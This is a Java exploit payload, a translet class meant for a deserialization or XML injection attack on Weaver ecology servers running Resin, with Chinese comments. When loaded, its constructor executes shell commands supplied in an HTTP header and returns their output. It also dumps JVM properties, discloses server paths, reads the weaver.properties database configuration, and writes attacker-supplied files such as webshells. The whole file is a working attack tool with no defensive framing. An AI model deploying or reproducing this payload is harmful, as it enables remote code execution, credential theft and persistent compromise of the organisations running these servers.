import com.caucho.server.http.HttpServletRequestImpl;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import sun.misc.BASE64Decoder;

import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.io.Serializable;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Scanner;
import javax.servlet.http.HttpServletResponse;

public class xmlRceWeaver extends AbstractTranslet implements Serializable {

    public void showRespose(String var1) throws Exception {
        Class si = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
        Method getContextRequest = si.getMethod("getContextRequest");
        HttpServletRequestImpl req = (HttpServletRequestImpl) getContextRequest.invoke((Object) null);
        HttpServletResponse rep = (HttpServletResponse) req.getServletResponse();
        PrintWriter out = rep.getWriter();
        out.println(var1);
        out.flush();
        out.close();
        return;
    }

    public xmlRceWeaver() throws Exception {
        try {
            String Cmdcontext;

            Class ServletInvocation = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
            Method getContextRequest = ServletInvocation.getMethod("getContextRequest");
            HttpServletRequestImpl req = (HttpServletRequestImpl) getContextRequest.invoke((Object) null);


            //执行系统命令
            if (req.getHeader("Session") != null) {
                String cmd = req.getHeader("Session");
                String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"sh", "-c", cmd};
                Cmdcontext = new Scanner(new ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next();
                System.err.println("This is  an  error message.");
                this.showRespose(Cmdcontext);
            }
            //输出jdk 环境变量
            if (req.getHeader("Echo") != null) {
                String echoinfo = new String(System.getProperties().toString().getBytes());
                this.showRespose(echoinfo);
            }
            // 获取web当前路径
            if (req.getHeader("ShowPath") != null) {
                String contextPath = Thread.currentThread().getContextClassLoader().getResource("").getPath();
                // d:/WEAVER/ecology/classbean/

                Class cls = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.http.HttpServletRequestImpl");
                String path = cls.getProtectionDomain().getCodeSource().getLocation().getPath();
                // D:/WEAVER/Resin/lib/resin.jar

                this.showRespose(path.substring(1));
                this.showRespose(contextPath.substring(1));
                // 获取数据库路径
                if (contextPath.contains("ecology")) {
                    path = contextPath.substring(1).split("ecology")[0].trim() + "ecology/WEB-INF/prop/weaver.properties";
                    //读取数据库内容
                    this.showRespose("\n[+]weaver database path: \n" + path + "\n");
                    byte[] bytes = Files.readAllBytes(Paths.get(path));
                    this.showRespose("[+] weaver database success:");
                    this.showRespose(new String(bytes));
                }
            }
            // header 写webshell
            String path = req.getHeader("WPath");
            if (path != null & !path.isEmpty()) {
                String content = req.getHeader("WContent");
                if (content != null && !content.isEmpty()) {
                    byte[] bytes = (new BASE64Decoder()).decodeBuffer(content);
                    FileOutputStream fileOutputStream = new FileOutputStream(path);
                    fileOutputStream.write(bytes);
                    fileOutputStream.close();
                    this.showRespose("[+] Write Success");
                }
            }

        } catch (Exception var6) {
            var6.printStackTrace();
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    /**
     * Main transform() method - this is overridden by the compiled translet
     *
     * @param document
     * @param iterator
     * @param handler
     */
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public static void main(String[] args) {

    }
}
